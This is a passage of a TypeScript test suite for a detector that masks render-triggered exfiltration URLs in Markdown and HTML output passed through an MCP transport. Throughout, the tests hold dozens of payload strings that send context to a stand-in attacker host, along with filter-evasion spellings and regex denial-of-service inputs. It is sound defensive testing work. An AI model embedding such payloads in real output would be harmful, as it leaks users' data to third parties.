// (pinned further down, so the gap stays a decision rather than an oversight)
// are the document's own INFRASTRUCTURE — `<script src>`, `<link href>`, CSS
// `url()` — which every quoted HTML or CSS file carries regardless of content.
// ---------------------------------------------------------------------------

// The tokenizer states already pinned for `<img>` are re-run against each new
// element, because extraction is the layer that failed twice on this floor: a
// destination the walker does not reach is not protected by any classifier.
test("T46: every newly covered render-triggered surface is flagged and masked", () => {
  const U = `https://${ATTACKER}/p?x=ctx`;
  expectFlaggedAndMasked([
    // an image fetched by an element that is not <img>
    `<input type="image" src="${U}" alt="go">`,
    `<INPUT TYPE="IMAGE" SRC="${U}">`,
    `<input alt="a>b" type=image src="${U}">`,
    `<video poster="${U}" controls></video>`,
    `<body background="${U}">`,
    `<table background="${U}"><tr><td>x</td></tr></table>`,
    `<table><tr><td background="${U}">x</td></tr></table>`,
    `<table><tr><th background="${U}">x</th></tr></table>`,
    `<table><tr background="${U}"><td>x</td></tr></table>`,
    // the SVG spelling of the image element's destination
    `<svg><image href="${U}" width="1" height="1"/></svg>`,
    `<svg><image xlink:href="${U}" width="1" height="1"/></svg>`,
    `<svg><image alt="a>b" HREF="${U}"/></svg>`,
    `<svg><filter id="f"><feImage href="${U}"/></filter></svg>`,
    `<svg><filter id="f"><feImage xlink:href="${U}"/></filter></svg>`,
    // media
    `<video src="${U}" controls></video>`,
    `<audio src="${U}" controls></audio>`,
    `<video controls><source src="${U}" type="video/mp4"></video>`,
    `<picture><source srcset="${U} 1x"><img src="/a.png"></picture>`,
    `<picture><source srcset="/a.png 1x, ${U} 2x"><img src="/a.png"></picture>`,
    `<video controls><track default src="${U}" kind="captions"></video>`,
    // embedded documents
    `<embed src="${U}" type="image/svg+xml">`,
    `<object data="${U}" type="image/svg+xml"></object>`,
    `<iframe src="${U}"></iframe>`,
    `<iframe alt="a>b" src=${U}></iframe>`,
    // navigation
    `<meta http-equiv="refresh" content="0;url=${U}">`,
    // the same tokenizer states already pinned for <img>
    `<video\n  alt="a>b"\n  poster="${U}">`,
    `<iframe data-note="see src=/a.png for details" src="${U}"></iframe>`,
    `<object data="${U}"`,
    `<embed/src="${U}"/>`,
    // the authority spellings the classifier resolves rather than recognizes
    `<iframe src="${BS}${BS}${ATTACKER}/p"></iframe>`,
    `<video poster="https:${ATTACKER}/p">`,
    `<audio src="https&#58;//${ATTACKER}/p">`,
    `<svg><image href="ht&Tab;tps://${ATTACKER}/p"/></svg>`,
  ]);
});

// The other direction. A relative destination in any of the same elements is
// same-origin and must stay unflagged, and so must the constructs whose element
// name only LOOKS like one of these.
test("T46: the newly covered surfaces add no false positive on relative destinations", () => {
  for (const content of [
    `<input type="image" src="/assets/go.png" alt="go">`,
    `<video poster="/assets/cover.png" src="/assets/demo.mp4" controls></video>`,
    `<audio src="/assets/clip.mp3" controls></audio>`,
    `<video controls><source src="/assets/demo.mp4"><track default src="/c.vtt"></video>`,
    `<picture><source srcset="/a.png 1x, /b.png 2x"><img src="/a.png"></picture>`,
    `<embed src="/assets/diagram.svg">`,
    `<object data="/assets/spec.pdf"></object>`,
    `<iframe src="/embed/demo.html"></iframe>`,
    `<body background="/assets/paper.png">`,
    `<table><tr><td background="/assets/cell.png">x</td></tr></table>`,
    `<svg><image href="/assets/logo.png"/></svg>`,
    `<svg><image xlink:href="./logo.png"/></svg>`,
    `<svg><filter id="f"><feImage href="/a.png"/></filter></svg>`,
    `<meta http-equiv="refresh" content="0;url=/next.html">`,
    `<meta http-equiv="refresh" content="5">`,
    // an element name that is not one of these
    `<inputs src="https://${ATTACKER}/p">`,
    `<videos poster="https://${ATTACKER}/p">`,
    `<objection data="https://${ATTACKER}/p">`,
    // markup written inside another element's quoted value is text, not an
    // element — the T53#F-004 decision, extended by construction to the new
    // elements because it lives in the scan resume, not in the branch
    `<img alt="<iframe src=https://${ATTACKER}/p>" src="/assets/logo.png">`,
    `<img alt="<video poster=https://${ATTACKER}/p>" src="/assets/logo.png">`,
    // prose that only mentions the attributes
    "Use poster= and background= on the element; see a > b for why.",
  ]) {
    expect(`${content}:${detectExfil(content, []).length}`).toBe(`${content}:0`);
  }
});

// `src` on an input fetches ONLY when the type is image. Flagging a text input's
// `src` would be a pure false positive: no renderer requests it.
test("T46: the input src surface is gated on type=image, not on the attribute name", () => {
  const U = `https://${ATTACKER}/p?x=ctx`;
  for (const content of [
    `<input type="text" src="${U}">`,
    `<input src="${U}">`,
    `<input type="hidden" src="${U}" value="x">`,
  ]) {
    expect(`${content}:${detectExfil(content, []).length}`).toBe(`${content}:0`);
  }
  // ASCII case-insensitively, and with the gate written after the destination
  expectFlaggedAndMasked([
    `<input src="${U}" type="Image">`,
    `<input type=IMAGE src="${U}">`,
  ]);
});

// The declarative-refresh content grammar. A URL inside any other meta fetches
// nothing, so the http-equiv gate is load-bearing in the same way type=image is.
test("T46: the meta refresh surface parses the content grammar and masks the whole directive", () => {
  const U = `https://${ATTACKER}/p?x=ctx`;
  expectFlaggedAndMasked([
    `<meta http-equiv="refresh" content="0;url=${U}">`,
    `<meta HTTP-EQUIV="Refresh" content="0; URL = ${U}">`,
    `<meta http-equiv="refresh" content="0,url=${U}">`,
    `<meta http-equiv="refresh" content="0;url='${U}'">`,
    `<meta http-equiv="refresh" content='0;url="${U}"'>`,
    // the url keyword is optional in every engine
    `<meta http-equiv="refresh" content="0;${U}">`,
    // a character-reference-written separator decodes before the grammar runs
    `<meta http-equiv="refresh" content="0&#59;url=${U}">`,
  ]);

  for (const content of [
    `<meta name="description" content="see ${U} for details">`,
    `<meta http-equiv="content-type" content="${U}">`,
    `<meta http-equiv="refresh" content="0;url=/next.html">`,
    `<meta http-equiv="refresh" content="10">`,
    `<meta http-equiv="refresh" content="">`,
  ]) {
    expect(`${content}:${detectExfil(content, []).length}`).toBe(`${content}:0`);
  }

  // The whole directive is the mask span, not just the URL: a timeout with the
  // destination removed is not a meaningful thing to leave behind.
  const directive = `<meta http-equiv="refresh" content="0;url=${U}">`;
  const redacted = applyRedaction(directive, detectExfil(directive, []));
  expect(redacted).toBe(`<meta http-equiv="refresh" content="[REDACTED:url]">`);
});

// The allowlist means the same thing for the new surfaces as for <img src>.
test("T46: allowlist semantics for the new surfaces match the image surface exactly", () => {
  for (const content of [
    `<iframe src="https://cdn.trusted.example/embed"></iframe>`,
    `<video poster="https://cdn.trusted.example/cover.png"></video>`,
    `<object data="https://cdn.trusted.example/spec.pdf"></object>`,
    `<svg><image href="https://cdn.trusted.example/logo.png"/></svg>`,
    `<meta http-equiv="refresh" content="0;url=https://cdn.trusted.example/next">`,
    `<input type="image" src="https://cdn.trusted.example/go.png">`,
  ]) {
    expect(`${content}:${detectExfil(content, ["trusted.example"]).length}`).toBe(
      `${content}:0`,
    );
  }
  // and the userinfo trick against an allowlisted host is still flagged
  expect(
    detectExfil(
      `<iframe src="https://cdn.trusted.example@${ATTACKER}/p"></iframe>`,
      ["trusted.example"],
    ).length,
  ).toBeGreaterThan(0);
});

// The navigation surface's remediation says what is different about it: masking
// an <img src> breaks one image, masking a refresh removes a navigation of the
// whole client. Distinct from both the image and the base texts.
test("T46: the meta refresh finding's remediation names the navigation consequence", () => {
  const matches = detectExfil(
    `<meta http-equiv="refresh" content="0;url=https://${ATTACKER}/p">`,
    [],
  );
  expect(matches[0]?.policyId).toBe("egress.html-meta-refresh-exfil");
  expect(matches[0]?.remediation).toContain("navigat");
  const image = detectExfil(`<img src="https://${ATTACKER}/p">`, []);
  expect(matches[0]?.remediation).not.toBe(image[0]?.remediation);
});

// The surfaces deliberately NOT covered, pinned so the gap is a recorded
// decision rather than an oversight — and so a future widening has to change a
// test on purpose. Each is measured released in T46-surfaces.ts and each has its
// named prerequisite in T46-implementation.md.
test("T46: the deliberately uncovered surfaces stay released, with their reason recorded", () => {
  const U = `https://${ATTACKER}/p?x=ctx`;
  for (const content of [
    // INFRASTRUCTURE — in every quoted HTML/CSS file. Prerequisite: a non-empty
    // default allowlist posture, which is a product decision outside this file.
    `<script src="${U}"></script>`,
    `<svg><script href="${U}"/></svg>`,
    `<link rel="stylesheet" href="${U}">`,
    `<link rel="preload" as="image" href="${U}">`,
    `<link rel="preload" as="image" imagesrcset="${U} 1x">`,
    // CSS — additionally needs a second grammar: @import's bare-string form and
    // image-set() carry a URL with no url() spelling.
    `<div style="background-image:url('${U}')">x</div>`,
    `<style>.a{background:url(${U})}</style>`,
    `<style>@import url("${U}");</style>`,
    `<style>@import "${U}";</style>`,
    `<style>@font-face{font-family:x;src:url("${U}")}</style>`,
    `<div style="background-image:image-set('${U}' 1x)">x</div>`,
    // A nested inline document. Prerequisite: recursion with offsets mapped back
    // through the character-reference decoding.
    `<iframe srcdoc="&lt;img src=&quot;${U}&quot;&gt;"></iframe>`,
    // NEVER — a <frame> start tag is ignored in the "in body" insertion mode and
    // a markdown-render client never produces a frameset document.
    `<frameset><frame src="${U}"></frameset>`,
    // NEVER — external SVG <use> is same-origin restricted in every engine.
    `<svg><use href="${U}#icon"/></svg>`,
    // NEVER — click- and submit-gated, so not zero-click by definition.
    `<a href="${U}">go</a>`,
    `<a href="/x" ping="${U}">go</a>`,
    `<form action="${U}"><input name="q"></form>`,
    `<button formaction="${U}">go</button>`,
  ]) {
    expect(`${content}:${detectExfil(content, []).length}`).toBe(`${content}:0`);
  }
});

// The detector is not where the floor is proved. The new classes are driven
// through the SAME functions the MCP transport and the durable sinks call.
const T46_CLASS_VECTORS: Array<{ name: string; note: string; policyId: string }> = [
  {
    name: "input type=image",
    note: `<input type="image" src="https://${ATTACKER}/p?x=ctx">`,
    policyId: "egress.html-image-exfil",
  },
  {
    name: "video poster",
    note: `<video poster="https://${ATTACKER}/p?x=ctx"></video>`,
    policyId: "egress.html-image-exfil",
  },
  {
    name: "background attribute",
    note: `<body background="https://${ATTACKER}/p?x=ctx">`,
    policyId: "egress.html-image-exfil",
  },
  {
    name: "svg image href",
    note: `<svg><image href="https://${ATTACKER}/p?x=ctx"/></svg>`,
    policyId: "egress.html-image-exfil",
  },
  {
    name: "video src",
    note: `<video src="https://${ATTACKER}/p?x=ctx"></video>`,
    policyId: "egress.html-media-exfil",
  },
  {
    name: "source srcset",
    note: `<picture><source srcset="https://${ATTACKER}/p?x=ctx 1x"></picture>`,
    policyId: "egress.html-media-exfil",
  },
  {
    name: "track src",
    note: `<video><track default src="https://${ATTACKER}/p?x=ctx"></video>`,
    policyId: "egress.html-media-exfil",
  },
  {
    name: "iframe src",
    note: `<iframe src="https://${ATTACKER}/p?x=ctx"></iframe>`,
    policyId: "egress.html-embedded-document-exfil",
  },
  {
    name: "object data",
    note: `<object data="https://${ATTACKER}/p?x=ctx"></object>`,
    policyId: "egress.html-embedded-document-exfil",
  },
  {
    name: "embed src",
    note: `<embed src="https://${ATTACKER}/p?x=ctx">`,
    policyId: "egress.html-embedded-document-exfil",
  },
  {
    name: "meta refresh",
    note: `<meta http-equiv="refresh" content="0;url=https://${ATTACKER}/p?x=ctx">`,
    policyId: "egress.html-meta-refresh-exfil",
  },
];

test("T46: the persistence materializer never writes an auto-fetch host for the new surfaces", () => {
  for (const vector of T46_CLASS_VECTORS) {
    const serialized = JSON.stringify({ note: vector.note });
    const output = prepareOutputForPersistence(GUARD_PASS, serialized);
    expect(`${vector.name}:${output.allowed}`).toBe(`${vector.name}:true`);
    if (!output.allowed) continue;
    expect(`${vector.name}:${output.content.includes(ATTACKER)}`).toBe(
      `${vector.name}:false`,
    );
    expect(`${vector.name}:${output.content === serialized}`).toBe(
      `${vector.name}:false`,
    );
  }
});

test("T46: the transport validator reports every new surface as redacted with the host gone", () => {
  for (const vector of T46_CLASS_VECTORS) {
    const result = validateOutputForTransport({
      format: "json",
      value: { note: vector.note },
    });
    expect(`${vector.name}:${result.ok}`).toBe(`${vector.name}:true`);
    if (!result.ok) continue;
    expect(`${vector.name}:${result.text.includes(ATTACKER)}`).toBe(
      `${vector.name}:false`,
    );
    expect(`${vector.name}:${result.redaction.state}`).toBe(
      `${vector.name}:redacted`,
    );
    expect(`${vector.name}:${result.redaction.reasons.includes(vector.policyId)}`).toBe(
      `${vector.name}:true`,
    );
  }

  // A quoted document whose destinations are all relative stays byte-identical
  // at the transport: covering these surfaces must not make an ordinary page a
  // finding.
  const relativePage =
    `<link rel="stylesheet" href="/site.css"><img src="/logo.png">` +
    `<video poster="/cover.png" src="/demo.mp4"></video>` +
    `<input type="image" src="/go.png"><svg><image href="/photo.png"/></svg>`;
  const benign = validateOutputForTransport({
    format: "json",
    value: { note: relativePage },
  });
  expect(benign.ok).toBe(true);
  if (!benign.ok) return;
  expect(benign.redaction.state).toBe("none");
});

// ---------------------------------------------------------------------------
// T71 — the two blockers T66 raised against T46's floor.
// Written before the fix; each failed on the pre-fix code.
// ---------------------------------------------------------------------------

// T66#F-001. Both gates T46 introduced decide on an attribute VALUE, and a
// renderer decodes character references in attribute values before it acts on
// them (HTML Standard 13.2.5.35-.39). `type="&#105;mage"` IS an image submit
// button and `http-equiv="&#114;efresh"` IS a refresh, so a gate reading the raw
// bytes releases the whole surface for one cheap spelling. This module already
// holds that premise twice — `renderableUrl` and `metaRefreshDestination` both
// decode for exactly this reason.
test("T71#F-001: the type=image and http-equiv=refresh gates read the value a renderer reads", () => {
  const U = `https://${ATTACKER}/p?x=ctx`;
  expectFlaggedAndMasked([
    // <input type=image src> — decimal, hexadecimal, trailing and
    // semicolon-less spellings of the gating value
    `<input type="&#105;mage" src="${U}">`,
    `<input type="&#x69;mage" src="${U}">`,
    `<input type="imag&#101;" src="${U}">`,
    `<input type="&#105mage" src="${U}">`,
    // <meta http-equiv=refresh> — the NAVIGATION surface, so the whole client
    // goes to the attacker rather than one subresource
    `<meta http-equiv="&#114;efresh" content="0;url=${U}">`,
    `<meta http-equiv="&#x72;efresh" content="0;url=${U}">`,
    `<meta http-equiv="refres&#104;" content="0;url=${U}">`,
    // a named reference whose character the tokenizer also decodes
    `<input type="&Tab;image" src="${U}">`,
  ]);

  // Decoding is not a licence to match loosely: `refresh&#59;` decodes to
  // `refresh;`, which no renderer refreshes on, and `type` still has to BE
  // `image` rather than merely contain it.
  for (const content of [
    `<meta http-equiv="refresh&#59;" content="0;url=${U}">`,
    `<meta http-equiv="&#114;efreshed" content="0;url=${U}">`,
    `<input type="&#105;mages" src="${U}">`,
    `<input type="text" src="${U}">`,
    `<input src="${U}">`,
    `<meta name="description" content="see ${U}">`,
  ]) {
    expect(`${content}:${detectExfil(content, []).length}`).toBe(`${content}:0`);
  }

  // The gate decodes for CLASSIFICATION only: the mask still lands on the raw
  // bytes, so the encoded gating value survives and the destination does not.
  const vector = `<input type="&#105;mage" src="${U}">`;
  const redacted = applyRedaction(vector, detectExfil(vector, []));
  expect(redacted).toBe(`<input type="&#105;mage" src="[REDACTED:url]">`);
});

// T66#F-002. CommonMark defines four image spellings and the floor covered two.
// The collapsed (`![a][]`) and shortcut (`![a]`) reference forms and a
// description carrying balanced brackets all render an auto-fetching <img>;
// verified against `marked` in T66-md-oracle.ts and T71-md-oracle.ts.
test("T71#F-002: every CommonMark image spelling a renderer auto-fetches is a finding", () => {
  const U = `https://${ATTACKER}/p?ctx=CTX`;
  expectFlaggedAndMasked([
    `![a][a]\n\n[a]: ${U}\n`, // full reference — the covered baseline
    `![a][]\n\n[a]: ${U}\n`, // collapsed
    `![a]\n\n[a]: ${U}\n`, // shortcut
    `See ![logo] for the badge.\n\n[logo]: ${U}\n`, // shortcut in prose
    `![Logo][]\n\n[logo]: ${U}\n`, // collapsed, label folded like a renderer folds it
    `![a[b]c](${U})`, // balanced brackets in the description
    `![[a]](${U})`,
    `![a[b]](${U})`,
    `![x [y] z](${U})`,
    `Wow![link]\n\n[link]: ${U}\n`, // the `!` need not start the line
    `![a]\n\n   [a]: ${U}\n`, // an indented definition is still a definition
  ]);

  // What must stay released. A plain reference LINK is click-gated in every one
  // of the same three spellings, and a relative destination is same-origin.
  for (const content of [
    `[a]\n\n[a]: ${U}\n`,
    `[a][]\n\n[a]: ${U}\n`,
    `[a][a]\n\n[a]: ${U}\n`,
    `![a]\n\n[a]: /assets/logo.png\n`,
    `![a][b]\n\n[a]: ${U}\n`, // full reference, undefined label — literal text
    `![zz][]\n\n[a]: ${U}\n`, // collapsed, undefined label — literal text
    `![nope]\n\nno definition here\n`,
  ]) {
    expect(`${content}:${detectExfil(content, []).length}`).toBe(`${content}:0`);
  }

  // An inline destination wins over a definition of the same label, exactly as
  // CommonMark resolves it, so the definition is not additionally flagged.
  const inlineWins = `![a](${U})\n\n[a]: https://other.invalid/x\n`;
  const found = detectExfil(inlineWins, []);
  expect(found.length).toBe(1);
  expect(found[0]?.policyId).toBe("egress.markdown-image-exfil");
});

// The description grammar must not become a nesting BOUND. Every previous
// repair on this surface that bounded the judgement (a digit count in the
// decoder, a negated character class in the extractor) was defeated by writing
// one more of whatever was bounded.
test("T71#F-002: the balanced-bracket description is unbounded, not bounded", () => {
  const U = `https://${ATTACKER}/p?ctx=CTX`;
  const vectors: string[] = [];
  for (let depth = 1; depth <= 6; depth += 1) {
    const inner = "x".repeat(depth);
    vectors.push(`![a${"[".repeat(depth)}${inner}${"]".repeat(depth)}b](${U})`);
  }
  expectFlaggedAndMasked(vectors);
});

// The detector is not where the floor is proved: the two blockers are driven
// through the same functions the MCP transport and the durable sinks call. This
// also closes T66#F-009's pinning gap for these rows.
const T71_CLASS_VECTORS: Array<{ name: string; note: string; policyId: string }> = [
  {
    name: "input type charref",
    note: `<input type="&#105;mage" src="https://${ATTACKER}/p?x=ctx">`,
    policyId: "egress.html-image-exfil",
  },
  {
    name: "input type trailing charref",
    note: `<input type="imag&#101;" src="https://${ATTACKER}/p?x=ctx">`,
    policyId: "egress.html-image-exfil",
  },
  {
    name: "meta http-equiv charref",
    note: `<meta http-equiv="&#114;efresh" content="0;url=https://${ATTACKER}/p?x=ctx">`,
    policyId: "egress.html-meta-refresh-exfil",
  },
  {
    name: "meta http-equiv hex charref",
    note: `<meta http-equiv="&#x72;efresh" content="0;url=https://${ATTACKER}/p?x=ctx">`,
    policyId: "egress.html-meta-refresh-exfil",
  },
  {
    name: "collapsed reference image",
    note: `![a][]\n\n[a]: https://${ATTACKER}/p?ctx=CTX\n`,
    policyId: "egress.reference-link-exfil",
  },
  {
    name: "shortcut reference image",
    note: `See ![logo] here.\n\n[logo]: https://${ATTACKER}/p?ctx=CTX\n`,
    policyId: "egress.reference-link-exfil",
  },
  {
    name: "balanced-bracket description",
    note: `![a[b]c](https://${ATTACKER}/p?ctx=CTX)`,
    policyId: "egress.markdown-image-exfil",
  },
];

test("T71: the persistence materializer never writes an auto-fetch host for the T66 blockers", () => {
  for (const vector of T71_CLASS_VECTORS) {
    const serialized = JSON.stringify({ note: vector.note });
    const output = prepareOutputForPersistence(GUARD_PASS, serialized);
    expect(`${vector.name}:${output.allowed}`).toBe(`${vector.name}:true`);
    if (!output.allowed) continue;
    expect(`${vector.name}:${output.content.includes(ATTACKER)}`).toBe(
      `${vector.name}:false`,
    );
    expect(`${vector.name}:${output.content === serialized}`).toBe(
      `${vector.name}:false`,
    );
  }
});

test("T71: the transport validator reports every T66 blocker as redacted with the host gone", () => {
  for (const vector of T71_CLASS_VECTORS) {
    const result = validateOutputForTransport({
      format: "json",
      value: { note: vector.note },
    });
    expect(`${vector.name}:${result.ok}`).toBe(`${vector.name}:true`);
    if (!result.ok) continue;
    expect(`${vector.name}:${result.text.includes(ATTACKER)}`).toBe(
      `${vector.name}:false`,
    );
    expect(`${vector.name}:${result.redaction.state}`).toBe(
      `${vector.name}:redacted`,
    );
    expect(`${vector.name}:${result.redaction.reasons.includes(vector.policyId)}`).toBe(
      `${vector.name}:true`,
    );
  }
});

// ---------------------------------------------------------------------------
// T77 — the three blockers and two of the majors T72 raised against T71's
// scanner. Written before the fix; each failed on the pre-fix code.
// ---------------------------------------------------------------------------

// T72#F-001. CommonMark lets a link's TEXT contain an image, and the image
// renders — `[![badge](URL)](href)` is the README badge idiom and the single
// most common markdown shape there is. T71's scanner took the OUTER reading,
// read `isImage` from the outer bracket's missing `!`, called the whole thing a
// click-gated link and advanced the scan past the interior, so the inner image
// was never examined by either pass. An image's description IS alt text and
// nothing inside it is fetched; a link's description is content and an image
// inside it is fetched. That asymmetry, not the `.find`, is the rule.
test("T77#F-001: an image inside a link is a finding in every spelling", () => {
  const U = `https://${ATTACKER}/p?ctx=CTX`;
  expectFlaggedAndMasked([
    `[![badge](${U})](https://example.com/repo)`, // inline image in a link
    `Build: [![build](${U})](https://ci.example.com/job) — green.`, // in prose
    `- [![badge](${U})](https://example.com/repo)\n`, // in a list
    `[![badge](<${U}>)](https://example.com/repo)`, // angle-bracket destination
    `[![badge]](https://example.com/repo)\n\n[badge]: ${U}\n`, // shortcut image
    `[![badge][b]](https://example.com/repo)\n\n[b]: ${U}\n`, // full reference
    `[![a][]](https://example.com/repo)\n\n[a]: ${U}\n`, // collapsed reference
  ]);

  // The converse must NOT move. An image inside an IMAGE's description is alt
  // text: `marked` renders only the outer destination, so the interior stays
  // unexamined and the outer destination is the one finding.
  const imageInImage = `![a[b](https://other.invalid/inner)](${U})`;
  const inner = detectExfil(imageInImage, []);
  expect(inner.length).toBe(1);
  expect(inner[0]?.value).toBe(U);

  // A link whose TEXT carries brackets but no image is still click-gated, and a
  // link's destination is still not a finding without a credential locator.
  for (const content of [
    `[a[b]c](${U})`,
    `[![badge](/assets/local.png)](${U})`,
    `[text](${U})`,
  ]) {
    expect(`${content}:${detectExfil(content, []).length}`).toBe(`${content}:0`);
  }
});

// T72#F-002. `MAX_REFERENCE_LABEL = 999` was justified as the standard's bound,
// so that refusing a longer label was "renderer-faithful". Measured against the
// renderer this flow uses as its oracle it is not: `marked` resolves a 1000- and
// a 1200-character label and emits the <img>, and the pattern the scanner
// replaced was unbounded and flagged it. A bound on the judgement, defeated by
// writing one more of whatever was bounded, for the seventh time on this file.
test("T77#F-002: a reference label past 999 characters is still a finding", () => {
  const U = `https://${ATTACKER}/p?ctx=CTX`;
  const vectors: string[] = [];
  for (const length of [998, 999, 1000, 1200, 4096]) {
    const label = "L".repeat(length);
    vectors.push(`![a][${label}]\n\n[${label}]: ${U}\n`); // full
    vectors.push(`![${label}]\n\n[${label}]: ${U}\n`); // shortcut
    vectors.push(`![${label}][]\n\n[${label}]: ${U}\n`); // collapsed
  }
  expectFlaggedAndMasked(vectors);

  // Still released: a long label with NO definition is literal text, in every
  // form. The gate is "does this document define it", not "how long is it".
  for (const content of [
    `![a][${"L".repeat(1200)}]\n\nnothing defines it\n`,
    `![${"L".repeat(1200)}]\n\nnothing defines it\n`,
    `[${"L".repeat(1200)}]\n\n[${"L".repeat(1200)}]: ${U}\n`, // a LINK, click-gated
  ]) {
    expect(`len${content.length}:${detectExfil(content, []).length}`).toBe(
      `len${content.length}:0`,
    );
  }
});

// T72#F-005. CommonMark matches link labels after collapsing consecutive
// internal whitespace (a newline included) to a single space, on BOTH sides.
// `trim().toLowerCase()` alone released a use whose label differs from its
// definition only in internal whitespace, which `marked` resolves.
test("T77#F-005: reference labels are matched with CommonMark whitespace collapse", () => {
  const U = `https://${ATTACKER}/p?ctx=CTX`;
  expectFlaggedAndMasked([
    `![x][b  c]\n\n[b c]: ${U}\n`, // use has the wider run
    `![x][b c]\n\n[b  c]: ${U}\n`, // definition has the wider run
    `![x][b\n c]\n\n[b c]: ${U}\n`, // a newline inside the label
    `![x][ b c ]\n\n[b c]: ${U}\n`, // leading/trailing, already handled by trim
    `![x][B  C]\n\n[b c]: ${U}\n`, // folded as well as collapsed
    `![b  c]\n\n[b c]: ${U}\n`, // the shortcut form takes the same path
  ]);

  // Collapsing whitespace is not a licence to match loosely: a label that
  // differs by a non-whitespace character still does not resolve.
  for (const content of [
    `![x][b-c]\n\n[b c]: ${U}\n`,
    `![x][bc]\n\n[b c]: ${U}\n`,
  ]) {
    expect(`${content}:${detectExfil(content, []).length}`).toBe(`${content}:0`);
  }
});

// T72#F-004. The srcset branch reads an attribute value as a GRAMMAR and split
// it on the RAW bytes. A renderer's tokenizer decodes the attribute value first
// (HTML Standard 13.2.5.35-.39) and only then runs "parse a srcset attribute",
// so `a.png&#44;https://attacker…` is ONE candidate here and TWO there. Under
// the empty default allowlist the whole raw string still resolved to the first
// host and was masked; under a NON-EMPTY allowlist carrying that first host —
// the documented remedy for every false positive in this floor — the finding
// disappeared and the second candidate reached the client.
test("T77#F-004: an entity-encoded comma cannot hide a srcset candidate", () => {
  const U = `https://${ATTACKER}/p?ctx=CTX`;
  const allowlist = ["cdn.example.org"];
  for (const content of [
    `<img srcset="https://cdn.example.org/a.png&#44;${U} 2x">`,
    `<img srcset="https://cdn.example.org/a.png&#x2c;${U} 2x">`,
    `<source srcset="https://cdn.example.org/a.png&#44;${U} 2x">`,
  ]) {
    const matches = detectExfil(content, allowlist);
    expect(`${content}:${matches.length > 0}`).toBe(`${content}:true`);
    expect(applyRedaction(content, matches)).not.toContain(ATTACKER);
  }

  // The allowlist must still work when no boundary is hidden: an ordinary
  // two-candidate srcset entirely on an allowlisted host stays released, and
  // the raw-comma spelling of the attack is still caught candidate by candidate.
  const benign = `<img srcset="https://cdn.example.org/a.png 1x, https://cdn.example.org/b.png 2x">`;
  expect(detectExfil(benign, allowlist).length).toBe(0);
  const rawComma = `<img srcset="https://cdn.example.org/a.png 1x, ${U} 2x">`;
  expect(detectExfil(rawComma, allowlist).length).toBe(1);
  expect(applyRedaction(rawComma, detectExfil(rawComma, allowlist))).not.toContain(
    ATTACKER,
  );
});

// T72#F-003. `INLINE_DESTINATION` backtracks over every split of a run of
// non-`)` bytes, so ONE unterminated inline destination is quadratic in the run
// length, and a leading run of `[` makes it cubic. The floor is mandatory and
// the payload is attacker-chosen, so this is a denial-of-service surface in a
// security control, not a tidiness matter. The budget below is two orders of
// magnitude above the fixed cost and two orders BELOW the defect.
test("T77#F-003: no pathological input inside the mandatory floor", () => {
  const BUDGET_MS = 500;
  const shapes: Record<string, string> = {
    // cubic before the fix: 1 182.8 ms at 2 005 bytes (T72-perf2)
    openRunThenUnterminated: "[".repeat(1000) + "![a](" + "A".repeat(1000),
    // quadratic before the fix: 692.4 ms at 25 005 bytes (T72-perf)
    unterminatedDestination: "![a](" + "A".repeat(25000),
    unterminatedDestinationAngle: "![a](<" + "A".repeat(25000),
    // the shapes T71 measured must not regress
    openBracketRun: "[".repeat(50000),
    bangBracketRun: "![".repeat(50000),
    balancedNest: "[".repeat(25000) + "]".repeat(25000),
    // many opens sharing one description end, all reaching the same `)`
    sharedDestination: "[".repeat(20000) + "](" + "A".repeat(20000) + ")",
    emptyDescriptionRun: "[](".repeat(20000) + ")",
    // a long label run with a definition present, so the reference pass is live
    longLabelRun: "![".repeat(20000) + "]\n\n[a]: https://cdn.example.org/x\n",
  };
  for (const [id, text] of Object.entries(shapes)) {
    const started = performance.now();
    detectExfil(text, []);
    const elapsed = performance.now() - started;
    expect(`${id}:${elapsed < BUDGET_MS}`).toBe(`${id}:true`);
  }
});

// The detector is not where the floor is proved. Every class above is driven
// through the same functions the MCP transport and the durable sinks call.
const T77_CLASS_VECTORS: Array<{ name: string; note: string; policyId: string }> = [
  {
    name: "linked inline image",
    note: `[![build](https://${ATTACKER}/p?ctx=CTX)](https://ci.example.com/job)`,
    policyId: "egress.markdown-image-exfil",
  },
  {
    name: "linked shortcut image",
    note: `[![build]](https://ci.example.com/job)\n\n[build]: https://${ATTACKER}/p?ctx=CTX\n`,
    policyId: "egress.reference-link-exfil",
  },
  {
    name: "linked image in prose",
    note: `Status: [![b](https://${ATTACKER}/p?ctx=CTX)](https://ci.example.com/job) is green.\n`,
    policyId: "egress.markdown-image-exfil",
  },
  {
    name: "reference label past 999",
    note: `![a][${"L".repeat(1200)}]\n\n[${"L".repeat(1200)}]: https://${ATTACKER}/p?ctx=CTX\n`,
    policyId: "egress.reference-link-exfil",
  },
  {
    name: "shortcut label past 999",
    note: `![${"L".repeat(1200)}]\n\n[${"L".repeat(1200)}]: https://${ATTACKER}/p?ctx=CTX\n`,
    policyId: "egress.reference-link-exfil",
  },
  {
    name: "label differing by internal whitespace",
    note: `![x][b  c]\n\n[b c]: https://${ATTACKER}/p?ctx=CTX\n`,
    policyId: "egress.reference-link-exfil",
  },
];

test("T77: the persistence materializer never writes an auto-fetch host for the T72 blockers", () => {
  for (const vector of T77_CLASS_VECTORS) {
    const serialized = JSON.stringify({ note: vector.note });
    const output = prepareOutputForPersistence(GUARD_PASS, serialized);
    expect(`${vector.name}:${output.allowed}`).toBe(`${vector.name}:true`);
    if (!output.allowed) continue;
    expect(`${vector.name}:${output.content.includes(ATTACKER)}`).toBe(
      `${vector.name}:false`,
    );
    expect(`${vector.name}:${output.content === serialized}`).toBe(
      `${vector.name}:false`,
    );
  }
});

test("T77: the transport validator reports every T72 blocker as redacted with the host gone", () => {
  for (const vector of T77_CLASS_VECTORS) {
    const result = validateOutputForTransport({
      format: "json",
      value: { note: vector.note },
    });
    expect(`${vector.name}:${result.ok}`).toBe(`${vector.name}:true`);
    if (!result.ok) continue;
    expect(`${vector.name}:${result.text.includes(ATTACKER)}`).toBe(
      `${vector.name}:false`,
    );
    expect(`${vector.name}:${result.redaction.state}`).toBe(
      `${vector.name}:redacted`,
    );
    expect(`${vector.name}:${result.redaction.reasons.includes(vector.policyId)}`).toBe(
      `${vector.name}:true`,
    );
  }

  // AC5's third clause, re-pinned against this round's change: a public
  // Markdown link is not a network send, and a link wrapping a LOCAL image is
  // not one either — the badge fix must not turn every README link into a
  // finding.
  for (const note of [
    `See [the docs](https://docs.example.org/guide) for details.`,
    `[![badge](/assets/build.svg)](https://ci.example.com/job)`,
  ]) {
    const benign = validateOutputForTransport({ format: "json", value: { note } });
